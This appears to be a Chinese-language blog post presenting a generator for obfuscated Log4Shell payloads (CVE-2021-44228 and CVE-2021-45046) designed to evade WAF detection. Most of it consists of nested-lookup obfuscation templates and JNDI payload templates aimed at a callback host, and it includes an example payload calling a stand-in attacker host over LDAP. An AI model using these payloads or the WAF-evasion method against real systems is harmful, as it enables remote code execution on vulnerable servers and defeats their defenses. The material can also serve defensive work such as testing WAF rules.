---
layout: post
title: "Log4Shell payload规避WAF检测技术研究与应用"
date: "2022-05-26"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Research
---

# Log4Shell-obfuscated-payloads-generator
## 设计思想
下面介绍本项目的四个设计思想：
1. Log4j支持递归解析嵌套的Lookup

    利用该功能，我们可以对payloads进行混淆，从而规避WAF的检测和拦截。
2. 大部分Lookups支持默认值语法
    
    如果我们想获取字符`d`的等效替换，可以利用默认值语法，检索一个不存在的变量，让Lookup失败。这样Lookup的结果就会返回我们指定的默认值`d`，例如`${env:IDONTEXIST:-d}`。
3. 可用的Lookups

    本文根据Apache Log4j Lookups手册，对所有的Lookups进行了测试，得到了可用于构造payload的Lookups：Context Map Lookup、Docker Lookup、Environment Lookup、EventLookup、Kubernetes Lookup、Log4j Configuration Location Lookup、Lower Lookup、Main Arguments Lookup (Application)、Map Lookup、Marker Lookup、Spring Boot Lookup、Structured Data Lookup、System Properties Lookup、Upper Lookup、Web Lookup，它们的前缀分别为：`ctx`、`docker`、`env`、`event`、`k8s`、`log4j`、`lower`、`main`、`map`、`marker`、`spring`、`sd`、`sys`、`upper`、`web`，这些Lookups的共同特征是支持默认值语法，在下文中将简称为“可用的Lookups”。我们将这些Lookups作为对`jndi`部分和协议字段部分中字符的等效替换，生成初级混淆的payload。
4. 初级混淆与二次混淆的区别

    假设我们有一个简单的Log4Shell payload，它看起来像这样：`${jndi:ldap://evilhost.com:1389/a}`。其中，`jndi`和`ldap`部分特征明显，很容易被WAF拦截。初级混淆仅对`jndi`部分和协议字段（`rmi`、`dns`、`ldap`）部分中的关键字进行等效替换，从形式上来看进行了一次嵌套Lookup。可以看到，虽然利用了Lookups的默认值语法得到了与字符`j`等效的`${event:rzbp7gf3lZ8W1oP3:-j}`，但是也引入了Event Lookup的前缀`event`，该前缀也可能被WAF拦截。所以，我们需要再次利用没有前缀的Lookups，对`event`前缀进行等效替换，从形式上来看进行了两次嵌套Lookup。实验结果表明，`:-`符号、`::-`符号和不存在的Lookup可以实现这个目标。利用这三种Lookups对前缀进行等效替换后，我们得到如下的内容：`${:-e}`、`${::-v}`、`${what:ever:-n}`。

## 模板设计
在介绍本项目的数据结构设计之前，需要了解混淆的模板和payloads模板：

下面是初级混淆的模板：

```bash
# Primary Obfuscated Colon Template
:
${::-:}
${lower::}
${k8s:{{random_variable}}:-:}
${env:{{random_variable}}:-:}
${ctx:{{random_variable}}:-:}
${main:{{main_argument_key}}:-:}
${main:{{random_variable}}:-:}
${map:{{random_variable}}:-:}
${sd:{{random_variable}}:-:}
${sys:{{random_variable}}:-:}
${web:{{random_variable}}:-:}
${docker:{{random_variable}}:-:}
${event:{{random_variable}}:-:}
${log4j:{{random_variable}}:-:}
${marker:{{random_variable}}:-:}
${spring:{{random_variable}}:-:}
${upper::}
${:-:}
${{{random_lookup}}:{{random_variable}}:-:}
```

```bash
# Primary Obfuscated Lowercase Template
{{lowercase}}
${::-{{lowercase}}}
${lower:{{lowercase}}}
${lower:{{uppercase}}}
${k8s:{{random_variable}}:-{{lowercase}}}
${env:{{random_variable}}:-{{lowercase}}}
${ctx:{{random_variable}}:-{{lowercase}}}
${main:{{main_argument_key}}:-{{lowercase}}}
${main:{{random_variable}}:-{{lowercase}}}
${map:{{random_variable}}:-{{lowercase}}}
${sd:{{random_variable}}:-{{lowercase}}}
${sys:{{random_variable}}:-{{lowercase}}}
${web:{{random_variable}}:-{{lowercase}}}
${docker:{{random_variable}}:-{{lowercase}}}
${event:{{random_variable}}:-{{lowercase}}}
${log4j:{{random_variable}}:-{{lowercase}}}
${marker:{{random_variable}}:-{{lowercase}}}
${spring:{{random_variable}}:-{{lowercase}}}
${:-{{lowercase}}}
${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
```

```bash
# Primary Obfuscated Uppercase Template
{{uppercase}}
${::-{{uppercase}}}
${k8s:{{random_variable}}:-{{uppercase}}}
${env:{{random_variable}}:-{{uppercase}}}
${ctx:{{random_variable}}:-{{uppercase}}}
${main:{{main_argument_key}}:-{{uppercase}}}
${main:{{random_variable}}:-{{uppercase}}}
${map:{{random_variable}}:-{{uppercase}}}
${sd:{{random_variable}}:-{{uppercase}}}
${sys:{{random_variable}}:-{{uppercase}}}
${web:{{random_variable}}:-{{uppercase}}}
${docker:{{random_variable}}:-{{uppercase}}}
${event:{{random_variable}}:-{{uppercase}}}
${log4j:{{random_variable}}:-{{uppercase}}}
${marker:{{random_variable}}:-{{uppercase}}}
${spring:{{random_variable}}:-{{uppercase}}}
${upper:{{uppercase}}}
${upper:{{lowercase}}}
${:-{{uppercase}}}
${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
```

模板中出现了大小写字母，随机变量名，Main Arguments Lookup的键的索引形式，不存在的Lookup的占位符。

下面是二次混淆的模板：

```bash
# Secondary Obfuscated Colon Template
:
${::-:}
${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}::}
${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-:}
${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-:}
${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-:}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-:}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-:}
${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-:}
${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-:}
${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-:}
${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-:}
${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-:}
${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-:}
${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-:}
${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-:}
${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-:}
${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}::}
${:-:}
${{{random_lookup}}:{{random_variable}}:-:}
```

```bash
# Unprefixed Lookup template that replaces the Lookup prefix
${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
${:-{{uppercase}}}
${:-{{lowercase}}}
${::-{{uppercase}}}
${::-{{lowercase}}}
{{uppercase}}
{{lowercase}}
```

模板中占位符的作用是对可用的Lookups的前缀利用无前缀的Lookups进行等效替换。

```bash
# Secondary Obfuscated Lowercase Template
{{lowercase}}
${::-{{lowercase}}}
${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}:{{lowercase}}}
${{{l_lookup}}{{o_lookup}}{{w_lookup}}{{e_lookup}}{{r_lookup}}:{{uppercase}}}
${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-{{lowercase}}}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{lowercase}}}
${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-{{lowercase}}}
${:-{{lowercase}}}
${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
```

```bash
# Secondary Obfuscated Uppercase Template
{{uppercase}}
${::-{{uppercase}}}
${{{k_lookup}}{{8_lookup}}{{s_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{e_lookup}}{{n_lookup}}{{v_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{c_lookup}}{{t_lookup}}{{x_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{main_argument_key}}:-{{uppercase}}}
${{{m_lookup}}{{a_lookup}}{{i_lookup}}{{n_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{m_lookup}}{{a_lookup}}{{p_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{s_lookup}}{{d_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{s_lookup}}{{y_lookup}}{{s_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{w_lookup}}{{e_lookup}}{{b_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{d_lookup}}{{o_lookup}}{{c_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{e_lookup}}{{v_lookup}}{{e_lookup}}{{n_lookup}}{{t_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{l_lookup}}{{o_lookup}}{{g_lookup}}{{4_lookup}}{{j_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{m_lookup}}{{a_lookup}}{{r_lookup}}{{k_lookup}}{{e_lookup}}{{r_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{s_lookup}}{{p_lookup}}{{r_lookup}}{{i_lookup}}{{n_lookup}}{{g_lookup}}:{{random_variable}}:-{{uppercase}}}
${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}:{{uppercase}}}
${{{u_lookup}}{{p_lookup}}{{p_lookup}}{{e_lookup}}{{r_lookup}}:{{lowercase}}}
${:-{{uppercase}}}
${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
```

下面是CVE-2021-44228和CVE-2021-45046 payloads的模板：

```bash
# CVE-2021-44228 payloads template
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}/{{random}}}
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}}
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{r_proto}}{{m_proto}}{{i_proto}}{{colon}}//{{callback_host}}/{{random}}}
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{d_proto}}{{n_proto}}{{s_proto}}{{colon}}//{{callback_host}}/{{random}}}
```

```bash
# CVE-2021-45046 payloads template
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}:1389/{{random}}}
${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}/{{random}}}
```

模板中出现的占位符将分别用于替换ldap、rmi、dns协议字段部分，冒号，恶意服务器的地址和随机字符串。

## 数据结构设计
下面是数据本项目的结构设计：

payload的模式schema由三个部分part组成，它们分别是lookups部分，proto部分和delititer部分。其中lookups部分有jndi前缀，proto部分有rmi，dns和ldap前缀。delimiter部分有colon_component前缀。schema看起来像是一个树状结构。

![schema的树状结构](/img/in-post/research/schema结构.jpg)

schema_one和schema_secondary在结构上完全相同。不同之处在于schema_one用于保存字符的初级混淆，schema_secondary用于保存字符的二次混淆。
mapping_of_placeholders_to_one_obfuscated_characters是占位符到初级混淆的字符的映射。mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character是用于二次混淆的lookup部分的占位符到字符的映射。方法generate_obfuscated_payloads会遍历映射，将payload模板中的占位符依次替换为对应的混淆后的字符。

在执行main函数之前，有一段全局代码逻辑，用于初始化数据结构。它的伪代码描述如下：
```
if 命令行参数中有指定生成混淆的payloads的四个选项之一
	cve_2021_44228_obfuscated_payloads_template = []
	cve_2021_45046_obfuscated_payloads_template = []
	if 命令行参数中有指定生成初级混淆的payloads的两个选项之一
		lower_case_one_obfuscated_templates = []
		upper_case_one_obfuscated_templates = []
		delimiter_one_obfuscated_templates = []
		初始化树状结构schema_one
		mapping_of_placeholders_to_one_obfuscated_characters = {...}
	if 命令行参数中有指定生成二次混淆的payloads的两个选项之一
		lower_case_secondary_obfuscated_templates = []
		upper_case_secondary_obfuscated_templates = []
		delimiter_secondary_obfuscated_templates = []
		初始化树状结构schema_secondary
		mapping_of_placeholders_to_secondary_obfuscated_characters = {...}
mapping_of_the_secondary_obfuscation_lookup_placeholder_to_character = {...}
```

